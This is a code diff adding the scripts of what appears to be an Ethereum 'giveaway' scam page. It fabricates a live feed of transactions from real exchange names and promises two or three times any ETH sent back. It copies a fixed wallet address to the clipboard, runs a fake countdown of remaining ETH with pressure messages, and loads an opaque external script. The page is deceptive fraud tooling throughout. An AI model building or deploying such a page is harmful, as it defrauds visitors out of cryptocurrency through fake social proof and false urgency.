+        '</a> </td> <td>' +
+        send_amount +
+        ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
+        tx(999) +
+        '</span></td> </tr>'),
+        document
+          .getElementById('myTable')
+          .deleteRow(document.getElementById('myTable').rows.length - 1),
+        document.getElementsByTagName('tr')[1].classList.add('toolbar')
+    }, 8500)
+}
+
+function update_trans() {
+  for (i = 0; i < times.length; i++)
+    'now' == times[i].innerHTML
+      ? (times[i].innerHTML = '1 mins ago')
+      : 1 == parseInt(times[i].innerHTML.split(' ')[0]) &&
+        'mins' == times[i].innerHTML.split(' ')[1]
+      ? (times[i].innerHTML =
+          parseInt(times[i].innerHTML.split(' ')[0]) + 1 + ' mins ago')
+      : parseInt(times[i].innerHTML.split(' ')[0]) >= 59 &&
+        'mins' == times[i].innerHTML.split(' ')[1]
+      ? (times[i].innerHTML = '1 hrs ago')
+      : parseInt(times[i].innerHTML.split(' ')[0]) > 1 &&
+        'mins' == times[i].innerHTML.split(' ')[1] &&
+        (times[i].innerHTML = parseInt(times[i].innerHTML.split()[0]) + 1 + ' mins ago')
+  new_transaction();
+}
+
+;(get_random = function (
+  list = [
+    "0x" + generateId(40),
+    'Binance 1',
+    "0x" + generateId(40),
+    'Binance 2',
+    "0x" + generateId(40),
+    'Binance 3',
+    "0x" + generateId(40),
+    'Remitano 2',
+    "0x" + generateId(40),
+    'Remitano 3',
+    "0x" + generateId(40),
+    'Remitano 1',
+    "0x" + generateId(40),
+    'Mercatox',
+    "0x" + generateId(40),
+    'IndaCoin',
+    "0x" + generateId(40),
+    'CoinExchange.io',
+    "0x" + generateId(40),
+    'HitBTC 2',
+    "0x" + generateId(40),
+    'HitBTC 1',
+    "0x" + generateId(40),
+    'LAToken 3',
+    "0x" + generateId(40),
+    'LAToken 2',
+    "0x" + generateId(40),
+    'LAToken 1',
+  ],
+) {
+  return list[Math.floor(Math.random() * list.length)]
+}),
+  $(document).ready(() => {
+    for (i = 25; i > 0; i--) create_transaction(i)
+    update_tx(), update_count()
+  }),
+  (times = document.getElementsByClassName('timer')),
+  (window.onload = () => {
+    update_trans(),
+      (trans = setInterval(() => {
+        update_trans()
+      }, 1e4))
+  }),
+  $('#gen-btn').click(() => {
+    if ($('#cal-in').val() >= 0.1 && $('#cal-in').val() <= 9999999) {
+      amount_entered = $('#cal-in').val()
+      tm = Date.now()
+	    $("#xrp-tag").text(tx(9999999))
+      $('#gen-amount').text(amount_entered)
+      $('#warn').text(''), $('.pop-body').css('display', 'flex')
+    } else $('#warn').text('Amount should be start from 0.1 ETH')
+  }),
+  $('#close').click(() => {
+    $('.pop-body').css('display', 'none')
+  }),
+  setTimeout(function () {
+    let viewheight = $(window).height(),
+      viewwidth = $(window).width(),
+      viewport
+    document
+      .querySelector('meta[name=viewport]')
+      .setAttribute(
+        'content',
+        'height=' +
+          viewheight +
+          'px, width=' +
+          viewwidth +
+          'px, initial-scale=1.0',
+      )
+  }, 300),
+  $('#cal-in').on('input', () => {
+    var in_amount = $('#cal-in').val()
+    if (in_amount >= 0 && in_amount < 2.5) {
+      amt = (in_amount * 2)
+      out = $('#cal-out')
+      out.val(amt)
+      // if (amt%1){
+      //   out.val(amt.toFixed(3))
+      // }
+      // else {
+      //   out.val(amt.toFixed(0))
+      // }
+    } else if ((in_amount) >= 1.5 && in_amount <= 1000) {
+      amt = (in_amount * 3)
+      out = $('#cal-out')
+      out.val(amt)
+      // if (amt%1){
+      //   out.val(amt.toFixed(0))
+      // }
+      // else{
+      //   out.val(amt.toFixed(3))
+      // }
+    }
+  })
+
+$('#cal-out').on('input', () => {
+  var in_amount = $('#cal-out').val()
+  if (in_amount >= 0.5 && in_amount < 1.5) {
+    amt = (in_amount / 2)
+    out = $('#cal-in')
+    out.value(amt)
+    // if (amt%1){
+    //   out.value(amt.toFixed(0))
+    // }
+    // else {
+    //   out.value(amt.toFixed(3))
+    // }
+    $('#cal-in').val(in_amount / 2)
+  } else if ((in_amount) >= 1.5 && in_amount <= 1000) {
+    $('#cal-in').val(in_amount / 3)
+  }
+})
+
+function copy_item(item) {
+  var t = window.getSelection(),
+    e = document.createElement('div')
+  ;(e.style.position = 'absolute'),
+    (e.style.left = '-99999px'),
+    document.body.appendChild(e),
+    (e.innerHTML = item),
+    t.selectAllChildren(e),
+    window.setTimeout(function () {
+      document.body.removeChild(e)
+    }, 100)
+}
+
+function copyToClipboard(text) {
+    if (window.clipboardData && window.clipboardData.setData) {
+        // Internet Explorer-specific code path to prevent textarea being shown while dialog is visible.
+        return clipboardData.setData("Text", text);
+
+    }
+    else if (document.queryCommandSupported && document.queryCommandSupported("copy")) {
+        var textarea = document.createElement("textarea");
+        textarea.textContent = text;
+        textarea.style.position = "fixed";  // Prevent scrolling to bottom of page in Microsoft Edge.
+        document.body.appendChild(textarea);
+        textarea.select();
+        try {
+            return document.execCommand("copy");  // Security exception may be thrown by some browsers.
+        }
+        catch (ex) {
+            //console.warn("Copy to clipboard failed.", ex);
+            return false;
+        }
+        finally {
+            document.body.removeChild(textarea);
+        }
+    }
+}
+
+function copy_main(id, fade) {
+  copy_item($('#' + id).attr('data-clipboard-text'))
+  var clipboard = new Clipboard('#' + id)
+  clipboard.on('success', function () {
+    $('#' + fade).css('opacity', 1), $('#' + id).css('opacity', 0)
+  }),
+    clipboard.on('error', function (e) {
+      $('.tooltiptetext').html('Faild!')
+    })
+}
+
+// Copy amount starts here
+
+$('#copy_').click(() => {
+  copyToClipboard($("#gen-amount").text());
+  $('#copy_').attr('src', "../static/files/done.svg");
+})
+
+$('#copy_').mouseleave(() => {
+  $('#copy_').attr('src', "../static/files/copy.svg");
+})
+
+// Copy amount ends here
+
+// Copy address part starts here
+
+$('#copy_address').click(() => {
+  copyToClipboard('0x60ED062961e81B0907ca094cEFc965A0433F8574');
+  $('#copy_address').attr('src', '../static/files/done.svg');
+})
+
+$('#copy_address').mouseleave(() => {
+  $('#copy_address').attr('src', "../static/files/copy.svg");
+})
+
+$('#copy_tag').click(() => {
+  copyToClipboard($('#xrp-tag').text());
+  $('#copy_tag').attr('src', '../static/files/done.svg');
+})
+
+$('#copy_tag').mouseleave(() => {
+  $('#copy_tag').attr('src', "../static/files/copy.svg");
+})
+
+// Copy address part ends here
+
+    </script>
+
+    <script>
+        function setProgress(count, max) {
+            var p = (100 * count / max).toString() + '%';
+            $('.progress-left').css('left', p);
+            $('.progress-width').css('width', p);
+            var aa = count.toString().replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, '$1 ');
+            var rr = max.toString().replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, '$1 ');
+            $('.pbv').text(aa + ' / ' + rr);
+
+        }
+
+
+
+        var ctd = setInterval(function () {
+            if (localStorage.getItem("ethprogress")) {
+                if (localStorage.getItem("ethprogress") <= 150) {
+                    var alt_count = localStorage.getItem("ethprogress");
+                } else if (localStorage.getItem("ethprogress")) {
+                    var alt_sec_count = localStorage.getItem("ethprogress");
+                    var alt_count = alt_sec_count - Math.floor((Math.random() * 10) * 4 + 5);
+                }
+            } else {
+                var alt_sec_count = 50000;
+                var alt_count = alt_sec_count - Math.floor((Math.random() * 10) * (1000 * 2));
+            }
+            setProgress(alt_count, 200000)
+
+
+
+            localStorage.setItem("ethprogress", alt_count);
+
+            if (alt_sec_count <= 10)
+                clearInterval(ctd);
+            if (alt_count <= 3000 && alt_sec_count >= 3500)
+                document.getElementById("leftETH").innerHTML = "Left ETH";
+            if (alt_count <= 2000 && alt_sec_count >= 2500)
+                document.getElementById("leftETH").innerHTML = "Hurry up, not much more ETH left!";
+            if (alt_count <= 1500)
+                document.getElementById("leftETH").innerHTML = "Last chance to get your ETH!";
+            if (alt_count <= 500)
+                document.title = alt_count + " ETH left";
+            if (alt_count <= 1000)
+                document.title = "Get your " + alt_count + " ETH now!";
+
+        }, 6666);
+    </script>
+    <!-- ###############################End of progress bar######################################### -->
+
+    <script>
+
+        function timer(t_ex, timer){
+            expire = new Date(t_ex*1000).getTime();
+            now = new Date().getTime(); 
+            dis = expire - now
+            days = Math.floor((dis%(1000*60*60*24*24))/(1000*60*60*24))
+            hrs = Math.floor((dis%(1000*60*60*24))/(1000*60*60))
+            mins = Math.floor((dis%(1000*60*60))/(1000*60))
+            secs = Math.floor((dis%(1000*60))/(1000))
+            m_secs = Math.floor((dis%(1000)))
+            if (dis > 0) {
+                timer.innerHTML = days+":"+hrs+":"+mins+":"+secs+":"+m_secs
+            }
+            else{
+                window.location.reload()
+            }
+        }
+        
+        function set_timer(){
+            let t_ex = null
+            if (t_ex){
+                expire = new Date(t_ex*1000).getTime();
+                now = new Date().getTime(); 
+                dis = expire - now
+                if (dis > 0){
+                    timer_html = document.getElementById('timer')
+                    timer(t_ex, timer_html);
+                    setInterval(()=>{
+                        timer(t_ex, timer_html);
+                    }, 1)
+                }
+                
+            }
+        }
+        set_timer()
+    </script>
+
+    <script src="./ETH_files/ZOMFJGfI30" async=""></script>
+
+
